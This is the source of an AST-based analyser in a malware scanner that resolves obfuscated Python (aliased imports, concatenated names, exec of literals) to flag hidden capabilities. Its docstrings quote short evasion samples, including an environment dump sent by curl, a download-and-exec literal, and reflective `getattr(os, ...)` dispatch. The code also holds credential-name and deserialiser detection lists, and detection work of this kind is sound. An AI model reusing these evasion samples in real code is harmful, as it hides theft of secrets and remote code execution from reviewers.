"""Resolving Python obfuscation that a byte pattern cannot see.

Capability rules match literal syntax: `os.system`, `base64.b64decode`,
`subprocess.run`. Bind the name differently and nothing labels, so no composite
can form and the file reports clean:

    from os import environ as ENV
    from subprocess import run as go
    go(["curl", "-d", str(dict(ENV)), url])          # identical logic, silent

    __builtins__["ex" + "ec"](payload)               # `exec` is never a token
    f = os.system; f(command)                        # nor is `os.system`

Every one of those targets is derivable **without running anything**. `ast.parse`
builds a tree and executes nothing -- the same reason `ecosystems/pypi.py`
already reads `setup.py` this way -- so the alias, the binding and the folded
string are all available to a static pass. That is what this module does.

**The guarantee it exists to keep.** Static analysis cannot decide runtime
behaviour, so the spec is not "catch everything". It is:

> No evasion is silent. Every technique used to hide behaviour is either
> resolved to the real behaviour, or lights up a signal of its own.

`resolve` handles everything constant-derivable. What it cannot name --
`getattr(os, decode(blob))()`, a target read from the network -- becomes
`Capability.DYNAMIC_DISPATCH` instead, so going dynamic to escape the name match
costs the attacker a different label rather than buying silence. The residue
after both is behaviour that exists only at runtime, which no static tool
observes and which the tool should not claim to.

**It adds to the regex path, never replaces it.** The patterns stay as the fast
prefilter and as the answer for files this cannot parse -- and a file that fails
to parse says so, because silently analysing less is the failure this project
is organised against.
"""

from __future__ import annotations

import ast
import re
from typing import TYPE_CHECKING, ClassVar

from cordon_scanner.analysis.python.pyfacts import (
    DNS_LOOKUPS,
    ENVIRONMENT,
    PRIMITIVES,
    SCRIPT_LAUNCH,
    AstCall,
    AstHit,
    PythonFacts,
)
from cordon_scanner.analysis.python.pysyntax import PythonSyntax
from cordon_scanner.analysis.python.vocabulary import (
    REFLECTIVE,
    WRITE_METHODS,
    WRITTEN_CODE_MAX,
    WRITTEN_CODE_MIN,
)
from cordon_scanner.foundation.capabilities import Capability

if TYPE_CHECKING:
    from collections.abc import Iterator


from cordon_scanner.analysis.python.analyzer_core import AnalyzerCore
from cordon_scanner.analysis.python.data_flows import DataFlows
from cordon_scanner.analysis.python.execution_flows import ExecutionFlows

CREDENTIAL_VARIABLE = re.compile(
    r"""(?ix)
    (?:^|[_.\-])
    (?:
        token | secret | password | passwd | passphrase | credential | credentials
      | api[_\-]?key | apikey | access[_\-]?key | private[_\-]?key | signing[_\-]?key
      | client[_\-]?secret | refresh[_\-]?token | bearer | auth | session | cookie
      | pat | sas | dsn
    )
    (?:$|[_.\-])
    """,
)
"""Environment variable names that hold credential material.

The pattern tier already draws this line and carries `os.environ.get('PORT')`
and `os.environ.get('DEBUG')` as negative tests: "reading a named setting is not
the same as serialising the whole environment, and a rule that cannot tell them
apart fires on every configuration module in existence."

This tier did not draw it, and being the AST tier it could draw it exactly -- it
has the key in hand. So every `os.getenv("HOME")`, `os.environ.get("DEBUG")` and
`os.environ["PATH"]` in existence was labelled credential access, and fed
`SUSPECT.EXFIL.001`: 675 findings across 234 of the 1,487 repositories measured,
a great many of them a module that reads its own configuration, calls an API and
starts a subprocess.

Whole-environment access stays credential access whatever the code does with it,
which is the other half of the pattern tier's rule and the half that matters:
`dict(os.environ)` is the shape that ships the lot."""


UNSAFE_LOADERS = frozenset(
    {"torch.load", "pickle.load", "pickle.loads", "joblib.load", "dill.load", "cloudpickle.load"}
)
"""Deserialisers that execute what the file names. `pickle.loads` is here for
`pickle.loads(open(path, "rb").read())`."""


class PythonSource:
    """Conveniences over the Python analyser: loops, .pth start-up lines, resolution."""

    @staticmethod
    def _word_key(word: str) -> str:
        """A command word as `_file_key` names a file: `"{out}"` is the variable `out`."""
        text = word.strip().strip("\"'")
        placeholder = re.fullmatch(r"\{(\w{1,80})\}", text)
        return f"name:{placeholder.group(1)}" if placeholder else text

    @staticmethod
    def loop_delay_lines(source: str) -> frozenset[int]:
        """Lines where a sleep is inside a loop, and so a schedule rather than a delay.

        `CAP.ANTI.DELAY.001` says in its own comment what this is for: a sleep at the top of
        a loop is a heartbeat, the only way to express that in one regex is a lookbehind over
        a fixed indentation, and a pattern that works at eight spaces and fails at four is
        worse than the finding it removes. "Expressing it properly means asking the AST
        whether the sleep is the first statement of a loop, which is a change to the Python
        tier rather than to a pattern." This is that change.

        `unslothai/unsloth` hangs a thread with `while True: time.sleep(3600)` to keep a
        partial download's handle open, and prints a heartbeat with
        `for _ in range(10000): time.sleep(300)`. vLLM's `_report_continuous_usage` is the
        case the comment names.

        Anywhere in the loop body, not only the first statement: a retry loop that sleeps
        after its attempt is the same shape and the same claim. What stays reported is a
        sleep in straight-line code, which is what a delay before a payload is.

        Returns nothing for source that does not parse, which leaves the pattern's answer
        standing -- the safe direction.
        """
        try:
            tree = PythonSyntax.shared(source)
        except (SyntaxError, ValueError, RecursionError):
            return frozenset()

        analyzer = PythonAnalyzer._prepared(tree)
        lines: set[int] = set()
        for node in PythonSyntax.of(tree, ast.While, ast.For, ast.AsyncFor):
            for inner in PythonSyntax.of(node, ast.Call):
                dotted = analyzer._dotted(inner.func)
                if dotted in SLEEP_CALLS or (dotted or "").endswith(".sleep"):
                    lines.add(getattr(inner, "lineno", 0))
        return frozenset(lines)

    @staticmethod
    def startup_lines(text: str) -> str:
        """The part of a `.pth` file Python executes: each line beginning `import` (followed by a
        space or tab), which `site` runs with `exec`. Every other line is a directory to add to the
        path, and is blanked rather than dropped so line numbers still point into the file."""
        return "\n".join(
            line if line.startswith(("import ", "import\t")) else "" for line in text.split("\n")
        )

    @staticmethod
    def resolve(source: str) -> Iterator[AstHit]:
        """Capabilities this source resolves to. Convenience over `PythonAnalyzer`."""
        yield from PythonAnalyzer.analyse(source)


DANGEROUS_NAMESPACES = frozenset({"os", "subprocess", "sys", "builtins", "__builtins__", "shutil"})
"""Namespaces where reflective access with a computed name has no benign
analogue worth the silence. `getattr(self, method_name)` on a plugin object is
ordinary; `getattr(os, something_decoded)` is not."""


class PythonAnalyzer(DataFlows, ExecutionFlows, AnalyzerCore):
    """Resolves capability primitives through aliases, bindings and constants."""

    @classmethod
    def analyse(cls, source: str, *, follow_literals: bool = True) -> list[AstHit]:
        """Capabilities resolvable from this source, or none if it will not parse.

        `follow_literals=False` leaves code held in string literals unread (see `_written_code`).
        A test suite writes code fixtures to disk as its ordinary business, and what such a
        fixture would do is not something the suite does.
        """
        try:
            tree = PythonSyntax.shared(source)
        except (SyntaxError, ValueError, RecursionError):
            return []
        analyzer = PythonAnalyzer._prepared(tree)
        analyzer._follow_literals = follow_literals
        analyzer._walk(tree)
        analyzer._downloaded_and_run(tree)
        analyzer._received_and_run(tree)
        analyzer._download_run_through_helpers(tree)
        analyzer._identity_sent(tree)
        analyzer._environment_sent(tree)
        analyzer._secret_sent(tree)
        return analyzer._hits

    DATA_PARSERS = frozenset({"ast.literal_eval", "literal_eval", "json.loads", "json.load"})
    """Parsers that turn text into values and cannot run any of it. `pickle` and `marshal` are
    not here: loading either can execute code."""

    def _decoded_into_data_parsers(self, tree: ast.AST) -> frozenset[int]:
        """Lines whose every decode is handed straight to a data parser.

        reportlab's `literal_eval(base64_decodebytes(label.encode()).decode())` reads a label
        back into a tuple; nothing decoded there can run. A line with any other decode keeps
        its hit."""
        parsed: set[int] = set()
        other: set[int] = set()
        parents = PythonSyntax.parents(tree)
        for node in PythonSyntax.of(tree, ast.Call):
            dotted = self._dotted(node.func)
            if dotted is None or PRIMITIVES.get(dotted) is not Capability.DECODE:
                continue
            current: ast.AST = node
            parent = parents.get(id(current))
            # Through `.decode(...)`, `.strip()` and the like on the decoded bytes.
            while (
                isinstance(parent, ast.Attribute)
                and isinstance(parents.get(id(parent)), ast.Call)
                and parent.attr in {"decode", "strip", "rstrip", "lstrip"}
            ):
                current = parents[id(parent)]
                parent = parents.get(id(current))
            consumer = self._dotted(parent.func) if isinstance(parent, ast.Call) else None
            (parsed if consumer in self.DATA_PARSERS else other).add(node.lineno)
        return frozenset(parsed - other)

    def _argument_value(self, node: ast.AST) -> str:
        """One argument folded to a string, or `""` if it is not derivable.

        A sequence folds to its elements joined by a space so that
        `subprocess.run(["sh", "-c", payload])` and `os.system("sh -c ...")`
        read the same to a rule, which is the point: they are the same act
        written two ways, and a rule author should not have to write it twice.
        """
        if isinstance(node, ast.List | ast.Tuple):
            parts = [PythonFacts.constant(element) or "" for element in node.elts]
            return " ".join(p for p in parts if p)
        # `constant` answers "what string is this", and deliberately returns
        # None for a bool or a number -- it exists to fold names and commands.
        # A rule asking about `shell=True` is asking about a literal that is
        # not a string, so it is rendered here rather than widening `constant`
        # for every other caller.
        if isinstance(node, ast.Constant) and isinstance(node.value, bool | int | float):
            return str(node.value)
        return PythonFacts.constant(node) or ""

    # -- Name resolution -------------------------------------------------

    #: What each kind of statement binds for `_collect_names`, by the method that binds it.
    _BIND: ClassVar[dict[type[ast.AST], str]] = {
        ast.Import: "_bind_import",
        ast.ImportFrom: "_bind_import_from",
        ast.Assign: "_bind_assignment",
        ast.For: "_bind_loop",
    }

    def _bind_import(self, node: ast.Import) -> None:
        for alias in node.names:
            self._aliases[alias.asname or alias.name] = alias.name

    def _bind_import_from(self, node: ast.ImportFrom) -> None:
        if node.module and not node.level:
            for alias in node.names:
                self._aliases[alias.asname or alias.name] = f"{node.module}.{alias.name}"

    def _bind_assignment(self, node: ast.Assign) -> None:
        if len(node.targets) != 1:
            return
        target = node.targets[0]
        if isinstance(target, ast.Name):
            dotted = self._dotted(node.value)
            if dotted:
                self._bindings[target.id] = dotted
            literal = PythonFacts.constant(node.value)
            if literal is not None:
                # A second, different assignment makes the value unknowable statically.
                known = self._strings.get(target.id, literal)
                self._strings[target.id] = literal if known == literal else None
            elif isinstance(node.value, ast.JoinedStr | ast.BinOp):
                # A built string, kept for `_sketch`; assigned twice, it is not one thing.
                if target.id in self._sketched:
                    self._sketches.pop(target.id, None)
                else:
                    self._sketches[target.id] = node.value
                self._sketched.add(target.id)
        elif (
            isinstance(target, ast.Tuple)
            and isinstance(node.value, ast.Tuple)
            and len(target.elts) == len(node.value.elts)
        ):
            # `a, b = eval("exec"), eval("compile")` binds each name as its own
            # assignment would.
            for name, value in zip(target.elts, node.value.elts, strict=True):
                dotted = self._dotted(value) if isinstance(name, ast.Name) else None
                if isinstance(name, ast.Name) and dotted:
                    self._bindings[name.id] = dotted

    def _bind_loop(self, node: ast.For) -> None:
        if isinstance(node.target, ast.Name) and PythonFacts.is_literal_strings(node.iter):
            # A loop over a literal list of strings. Every value the variable can
            # take is written out above it, so a call through it is not a name this
            # file withholds -- which is the whole of what the dynamic-dispatch
            # label claims.
            #
            # `odysseus` ends its `setup.py` with a dependency check:
            # `for mod in ["fastapi", "uvicorn", ...]: try: __import__(mod)`, and it
            # was reported at CRITICAL as install-time code reaching a function by a
            # computed name. Six names, all of them legible.
            self._enumerated.add(node.target.id)

    def _collect_names(self, tree: ast.AST) -> None:
        """Build the alias and binding maps before evaluating any call.

        Two passes because a module may bind a name after using it inside a
        function body, and the function runs later. Order in the file is not
        order of execution, and matching on the first would miss the ordinary
        case of a helper defined above its imports.
        """
        bindings: dict[str, int] = {}
        literal_bindings: dict[str, int] = {}
        for node in PythonSyntax.of(tree, ast.Assign):
            names = [t.id for t in node.targets if isinstance(t, ast.Name)]
            plain = isinstance(node.value, ast.Constant) and isinstance(node.value.value, str)
            for bound in names:
                bindings[bound] = bindings.get(bound, 0) + 1
                if plain:
                    literal_bindings[bound] = literal_bindings.get(bound, 0) + 1
        # Every binding of the name is a plain literal; a name reassigned from anything else
        # could hold that instead.
        self._plain_literals = {
            bound for bound, count in literal_bindings.items() if bindings.get(bound) == count
        }
        for node in PythonSyntax.nodes(tree):
            if isinstance(node, ast.Assign) and any(
                n.id == "__file__" for n in PythonSyntax.within(node.value, ast.Name)
            ):
                self._bundled_paths.update(t.id for t in node.targets if isinstance(t, ast.Name))
        self._collect_reads(tree)
        for node in PythonSyntax.of(tree, *self._BIND):
            getattr(self, self._BIND[type(node)])(node)
        # The tables are complete: from here a name resolves the same way every time it is asked.
        self._dotted_cache: dict[int, str | None] = {}

    def _collect_reads(self, tree: ast.AST) -> None:
        """The names the tree reads from local files, and the paths it bundles."""
        for node in PythonSyntax.nodes(tree):
            # Names holding the text of a local file: `l` in `for l in open(...)`, `t = open(...)
            # .read()`, `t = Path(...).read_text()`.
            source = (
                node.iter
                if isinstance(node, ast.For) and isinstance(node.target, ast.Name)
                else node.value
                if isinstance(node, ast.Assign)
                else None
            )
            if source is not None and PythonFacts.is_local_read(source):
                target = node.target if isinstance(node, ast.For) else None
                names = (
                    [target.id]
                    if isinstance(target, ast.Name)
                    else [t.id for t in getattr(node, "targets", []) if isinstance(t, ast.Name)]
                )
                self._local_reads.update(names)

    # -- Constant folding ------------------------------------------------

    # -- The walk --------------------------------------------------------

    def _walk(self, tree: ast.AST) -> None:
        for node in PythonSyntax.of(tree, ast.Call):
            if isinstance(node.func, ast.Call | ast.Subscript):
                # A subscript as well as a call. `globals()["exec"]()` invokes what the
                # subscript returned, and the map existed only for `getattr(...)()`.
                self._invoked[id(node.func)] = node

        keyed = self._keyed_environment_reads(tree)
        self._socket_connect(tree)

        called = {id(node.func) for node in PythonSyntax.nodes(tree) if isinstance(node, ast.Call)}
        """The function of every call, which `_call` has already judged.

        `os.getenv` is both a primitive and an `Attribute`, so a single
        `os.getenv("GH_TOKEN")` was recorded twice: once by `_call` and again by
        the branch below, which exists for `os.environ` -- a primitive that is
        never called. vLLM's `setup.py` line 1112 reads
        `os.getenv("GH_TOKEN", os.getenv("GITHUB_TOKEN"))` and produced four
        identical credential hits at one span. Reading a function without calling
        it is not the act the primitive describes."""

        for node in PythonSyntax.of(tree, *self._WALK):
            getattr(self, self._WALK[type(node)])(node, called, keyed)

    #: What `_walk` judges at each kind of node, by the method that judges it.
    _WALK: ClassVar[dict[type[ast.AST], str]] = {
        ast.Call: "_walk_call",
        ast.Attribute: "_walk_reference",
        ast.Name: "_walk_reference",
        ast.Subscript: "_walk_subscript",
    }

    def _walk_call(self, node: ast.Call, called: set[int], keyed: dict[int, str]) -> None:
        self._call(node)
        self._written_code(node)

    def _walk_reference(
        self, node: ast.Attribute | ast.Name, called: set[int], keyed: dict[int, str]
    ) -> None:
        # `os.environ` is a primitive without being called.
        dotted = self._dotted(node)
        if id(node) in called:
            return
        if dotted in PRIMITIVES and PRIMITIVES[dotted] is Capability.CREDENTIAL:
            if id(node) in keyed and not CREDENTIAL_VARIABLE.search(keyed[id(node)]):
                # `os.environ["PORT"]`. The whole mapping was never
                # reached for; one named setting was. See
                # `CREDENTIAL_VARIABLE`.
                return
            self._record(PRIMITIVES[dotted], node, dotted)

    def _walk_subscript(self, node: ast.Subscript, called: set[int], keyed: dict[int, str]) -> None:
        self._subscript(node)

    def _written_code(self, node: ast.Call) -> None:
        """Python source written to a file, analysed as the code it is.

        `tmp.write(b"from urllib.request import urlopen;exec(urlopen(URL).read())")` followed by
        running the file is a download-and-execute whose every primitive sits inside a literal, out
        of reach of an analysis that reads only the calls of the file itself. The literal's own calls
        are recorded at the `write` that puts them on disk, so the same composites that judge inline
        code judge it. Only a write's argument is read: a docstring example or a template that is
        never written is not code anyone runs. A literal nested in a written literal is shorter
        than it, so the recursion ends.

        A literal handed straight to `exec` is read the same way: `exec('import urllib.request as
        u;...')` keeps every primitive out of the file's own calls just as well.
        """
        if not node.args or not self._follow_literals:
            return
        written = isinstance(node.func, ast.Attribute) and node.func.attr in WRITE_METHODS
        if not written and self._dotted(node.func) not in ("exec", "eval", "compile"):
            return
        value = self._written_text(node.args[0])
        if (
            value is None
            or not WRITTEN_CODE_MIN <= len(value) <= WRITTEN_CODE_MAX
            or "(" not in value
        ):
            return
        try:
            inner_tree = PythonSyntax.parse(value)
        except (SyntaxError, ValueError, RecursionError):
            return
        inner = type(self)()
        inner._collect_names(inner_tree)
        if not written:
            # `exec` with no namespace of its own runs in the caller's, so the literal sees the
            # file's imports: `import subprocess as s` and then `exec("s.run(...)")`.
            inner._aliases = {**self._aliases, **inner._aliases}
        inner._walk(inner_tree)
        for hit in inner._hits:
            label = "written code" if written else "executed literal"
            self._record(
                hit.capability, node, f"{label}: {hit.detail}", hit.command, fixed=hit.fixed_command
            )

    def _call(self, node: ast.Call) -> None:
        dotted = self._dotted(node.func)
        if dotted == "open" and node.args:
            self._opened_for_persistence(node)
        if dotted in UNSAFE_LOADERS and self._loads_a_bundled_file(node, dotted):
            self._record(Capability.EXECUTE, node, f"unsafe model load: {dotted}")
        if self._runs_remote_model_code(node):
            self._record(Capability.EXECUTE, node, f"remote model code: {dotted or 'call'}")
        unsafe_option = PythonFacts.unsafe_model_option(node, dotted)
        if unsafe_option:
            self._record(Capability.EXECUTE, node, f"unsafe model option: {unsafe_option}")
        if dotted and dotted in PRIMITIVES:
            if dotted in ENVIRONMENT and PRIMITIVES[dotted] is Capability.CREDENTIAL:
                # `os.getenv("NAME")`, whose key is its first argument. With no
                # literal key the name is computed, and a computed lookup into the
                # environment is the broad access rather than a named setting.
                key = PythonFacts.constant(node.args[0]) if node.args else None
                if key is not None and not CREDENTIAL_VARIABLE.search(key):
                    return
            if (
                dotted in ("exec", "eval")
                and node.args
                and self._read_from_local_file(node.args[0])
            ):
                # `for l in open("src/pkg/__init__.py"): if l.startswith("Version"): exec(l, D)`
                # -- how reportlab's `setup.py`, and a great many others, read their own version.
                # The text is the package's own file, scanned here as what it is.
                self._excused_lines.add(node.lineno)
                return
            self._record(
                PRIMITIVES[dotted],
                node,
                dotted,
                command=self._command(node),
                fixed=PythonFacts.fixed_command(node),
            )
            return

        base = dotted.split(".")[-1] if dotted else None
        if base not in REFLECTIVE:
            return

        # `getattr(os, "system")` and friends. The first argument names the
        # namespace, the second the attribute.
        namespace = self._dotted(node.args[0]) if node.args else None
        attribute = PythonFacts.constant(node.args[1]) if len(node.args) > 1 else None

        if base == "__import__":
            imported = PythonFacts.constant(node.args[0]) if node.args else None
            first = node.args[0] if node.args else None
            if isinstance(first, ast.Name) and first.id in self._enumerated:
                # Enumerated rather than computed. See `_collect_names`.
                return
            if imported is None and first is not None and self._assembled_name(first):
                self._dynamic(node, "__import__ with a computed module name")
            return

        if attribute is not None and namespace:
            resolved = f"{namespace}.{attribute}"
            if resolved in PRIMITIVES:
                callsite = self._invoked.get(id(node), node)
                self._record(
                    PRIMITIVES[resolved],
                    node,
                    resolved,
                    command=self._command(callsite),
                    fixed=PythonFacts.fixed_command(callsite),
                )
                return
        if (
            len(node.args) > 1
            and attribute is None
            and namespace in DANGEROUS_NAMESPACES
            and self._assembled_name(node.args[1])
        ):
            if len(node.args) > 2 and id(node) not in self._invoked:
                # A DEFAULT, and nothing called. `getattr(x, name, None)` asks whether an
                # attribute exists and is prepared for it not to: the third argument is
                # the caller saying so. `unslothai/unsloth` writes
                # `if getattr(sys, f"__{name}__", None) is None:` to detect its runtime.
                #
                # Both halves are needed. `getattr(os, decode(blob), None)()` has a
                # default and IS dispatch, which is what the invocation test is for.
                return
            self._dynamic(node, f"{base} on {namespace} with a computed name")

    def _assembled_name(self, node: ast.AST) -> bool:
        """Whether a name handed to `__import__` or `getattr` could be anything.

        A literal is known, and so is a variable bound once to a plain one -- `PACKAGE = "Tea"`
        then `__import__(PACKAGE)`, how a great many `setup.py` files read their own version. A
        variable bound to a string built from pieces, `name = "sys" + "tem"`, is not: building it
        is the evasion, whatever it folds to. An
        attribute, `__import__(self.module)`, is a configuration object choosing a backend, which
        is what plugin loaders and build systems are made of. Anything else -- a parameter, a loop
        variable over something fetched, a built string -- stays dynamic: the name could be
        whatever the code was handed, which is the dispatch this tier exists to notice.
        """
        if isinstance(node, ast.Name) and node.id in self._plain_literals:
            return False
        return not isinstance(node, ast.Attribute)

    def _subscript(self, node: ast.Subscript) -> None:
        """`__builtins__["ex" + "ec"]` and `globals()["exec"]`."""
        container = self._dotted(node.value)
        if isinstance(node.value, ast.Call):
            inner = self._dotted(node.value.func)
            container = inner.split(".")[-1] if inner else None
        key = PythonFacts.constant(node.slice)

        if key is not None:
            if key in PRIMITIVES:
                self._record(PRIMITIVES[key], node, key)
            elif container and f"{container}.{key}" in PRIMITIVES:
                self._record(PRIMITIVES[f"{container}.{key}"], node, f"{container}.{key}")
            return

        if isinstance(node.ctx, ast.Store | ast.Del):
            # `globals()[name] = value` WRITES a name; it does not reach one. Re-exporting
            # from a C extension is how PyTorch populates `torch._dynamo`:
            #
            #     globals()[name] = getattr(torch._C._dynamo.eval_frame, name)
            #
            # Thirteen of PyTorch's twenty-five findings were that line and its siblings,
            # and `globals()[metric] += getattr(delta, metric)` is the same idiom
            # accumulating counters. The rule is about reaching a function by a computed
            # name, which is the READ half -- and the `getattr` on the right of these
            # assignments is exactly that, so the file still carries the capability when
            # the name it reads is genuinely computed.
            return

        if container in DANGEROUS_NAMESPACES or container in {"globals", "vars", "locals"}:
            if container in {"globals", "vars", "locals"} and id(node) not in self._invoked:
                # A READ of a module-level name, with nothing called.
                # `NousResearch/hermes-agent` caches a rendered banner as
                # `cached = globals()[cache_name]`, which reaches a VALUE by a computed
                # name -- and this rule is about reaching a FUNCTION by one.
                #
                # Only for the namespace dictionaries. `__builtins__[name]` stays a
                # finding whether it is called here or passed somewhere that will call
                # it, because nothing in `__builtins__` is a value worth fetching by a
                # computed name.
                return
            self._dynamic(node, f"{container}[...] with a computed key")

    # -- Recording -------------------------------------------------------

    def _dynamic(self, node: ast.AST, detail: str) -> None:
        """Reflective dispatch whose target could not be resolved.

        This is the point of the tier rather than a gap in it. An attacker who
        goes dynamic to escape the name match is forced to light this up
        instead, and combined with the decode, egress or credential access that
        malware needs anyway it is a combination with almost no benign
        analogue.
        """
        self._hits.append(
            AstHit(
                capability=Capability.DYNAMIC_DISPATCH,
                line=getattr(node, "lineno", 1),
                column=getattr(node, "col_offset", 0),
                detail=detail,
            )
        )

    @classmethod
    def excused_lines(cls, source: str) -> dict[Capability | str, frozenset[int]]:
        """Lines where the pattern tier's match is a known-harmless form this tier can see.

        `exec` of text read from the package's own file (EXECUTE), and the whole environment
        copied only to become a child process's environment (CREDENTIAL). The pattern tier sees
        `exec(` and `os.environ` and cannot tell what follows; the caller drops its hits on these
        lines and keeps every other."""
        try:
            tree = PythonSyntax.shared(source)
        except (SyntaxError, ValueError, RecursionError):
            return {}
        analyzer = PythonAnalyzer._prepared(tree)
        analyzer._walk(tree)
        handed = analyzer._environment_handed_to_children(tree)
        environment = {
            node.lineno
            for node in PythonSyntax.nodes(tree)
            if id(node) in handed and hasattr(node, "lineno")
        }
        # A line that also reads the environment some other way keeps its pattern hit.
        environment -= {
            node.lineno
            for node in PythonSyntax.nodes(tree)
            if analyzer._dotted(node) in ENVIRONMENT
            and id(node) not in handed
            and hasattr(node, "lineno")
        }
        own_name = frozenset(
            node.lineno
            for node in PythonSyntax.nodes(tree)
            if isinstance(node, ast.Call)
            and (analyzer._dotted(node.func) or "") in DNS_LOOKUPS
            and node.args
            and PythonFacts._own_name_locally(node.args[0])
        )
        patterns = PythonFacts._pattern_literals(tree)
        return {
            "CAP.EGRESS.DNS_CONSTRUCTED.001": own_name,
            Capability.PERSIST: PythonFacts._persistence_named_not_written(tree)
            | patterns
            | PythonFacts._persistence_not_reaching_a_write(source, tree, analyzer._hits),
            Capability.EXECUTE: frozenset(analyzer._excused_lines),
            Capability.CREDENTIAL: frozenset(environment) | patterns,
            Capability.DECODE: analyzer._decoded_into_data_parsers(tree),
        }

    @classmethod
    def calls(cls, source: str) -> list[AstCall]:
        """Every call in this source, with callee and arguments resolved.

        The same resolution `analyse` applies to the fixed `PRIMITIVES` table,
        exposed for rules to query instead. That table is this module's own
        list of what matters; a rule pack needs to name its own.

        Unparseable source yields nothing, which the caller must treat as "not
        examined" rather than "nothing here" -- the regex tier still runs over
        the same file, which is why this is an addition to it and never a
        replacement.
        """
        try:
            tree = PythonSyntax.shared(source)
        except (SyntaxError, ValueError, RecursionError):
            return []
        analyzer = PythonAnalyzer._prepared(tree)
        # `_invoked` maps an inner call to the call that invokes its result, so
        # `getattr(os, "system")("...")` can find the argument list that belongs
        # to the outer parentheses.
        for node in PythonSyntax.of(tree, ast.Call):
            if isinstance(node.func, ast.Call | ast.Subscript):
                analyzer._invoked[id(node.func)] = node

        # What each plain name is assigned, so a hostname assembled into a variable on one line
        # and resolved on the next reads as the built value it is.
        assigned: dict[str, list[ast.AST]] = {}
        for node in PythonSyntax.of(tree, ast.Assign):
            for target in node.targets:
                if isinstance(target, ast.Name):
                    assigned.setdefault(target.id, []).append(node.value)

        def constructed(argument: ast.AST) -> bool:
            if PythonFacts._is_constructed(argument):
                return True
            values = assigned.get(argument.id, []) if isinstance(argument, ast.Name) else []
            return bool(values) and all(
                PythonFacts._is_constructed(value) and PythonFacts._has_dotted_literal(value)
                for value in values
            )

        found: list[AstCall] = []
        for node in PythonSyntax.of(tree, ast.Call):
            resolved = analyzer._resolve_callee(node)
            if resolved is None:
                continue
            name, callsite = resolved
            found.append(
                AstCall(
                    name=name,
                    line=getattr(node, "lineno", 0),
                    column=getattr(node, "col_offset", 0),
                    arguments=tuple(analyzer._argument_value(a) for a in callsite.args),
                    keywords=tuple(
                        (kw.arg, analyzer._argument_value(kw.value))
                        for kw in callsite.keywords
                        if kw.arg
                    ),
                    has_constructed_argument=any(constructed(a) for a in callsite.args),
                )
            )
        return found

    @classmethod
    def _prepared(cls, tree: ast.AST) -> PythonAnalyzer:
        """An analyser with this tree's name tables already built, each table its own copy.

        Four entry points (`analyse`, `calls`, `excused_lines` and `PythonSource.loop_delay_lines`)
        each built the same tables from scratch: 3.2 builds per file. They are built once per tree now, kept on it, and copied per caller, so what one
        caller adds -- `_walk` fills `_invoked` and records hits -- reaches no other.
        """
        base = tree.__dict__.get("_cordon_names")
        if base is None:
            base = cls()
            base._collect_names(tree)
            tree.__dict__["_cordon_names"] = base
        fresh = cls()
        for name, value in vars(base).items():
            if name == "_hits":
                continue
            setattr(fresh, name, value.copy() if isinstance(value, dict | set | list) else value)
        return fresh

    @classmethod
    def safe_spawn_lines(cls, source: str) -> frozenset[int]:
        """Lines of a spawn or execute whose command is provably source-free, so it cannot be
        running a decoded value -- the Python analogue of `JsFlow.safe_spawn_lines`, which
        `DecodeRun` uses to drop such a spawn from a decode-run pairing. `os.system(f"{sys.executable}
        -m pip install requests")` is here; `exec(b64decode(blob))` and `subprocess.run(cmd)` for
        any sourced `cmd` are not (fail-closed). A bare shell, a `start x.vbs` script launch, or a
        command that runs a file the unit writes is kept too: there the literal IS the act
        (`_fixed_command`'s guards)."""
        try:
            tree = PythonSyntax.shared(source)
        except (SyntaxError, ValueError, RecursionError):
            return frozenset()
        analyzer = PythonAnalyzer._prepared(tree)
        analyzer._walk(tree)
        lines: set[int] = set()
        for node in PythonSyntax.of(tree, ast.Call):
            if PRIMITIVES.get(analyzer._dotted(node.func) or "") not in (
                Capability.SPAWN,
                Capability.EXECUTE,
            ):
                continue
            folded = analyzer._source_free_command(node)
            if (
                folded is None
                or PythonFacts.BARE_SHELL.match(folded)
                or SCRIPT_LAUNCH.search(folded)
            ):
                continue
            if PythonFacts.WRITABLE_TARGET.search(folded) is None:
                lines.add(node.lineno)
        return frozenset(lines)


SLEEP_CALLS = frozenset({"time.sleep", "asyncio.sleep", "trio.sleep", "anyio.sleep"})
"""The ways Python waits, as a dotted name."""


__all__ = ["SLEEP_CALLS", "PythonAnalyzer", "PythonSource"]
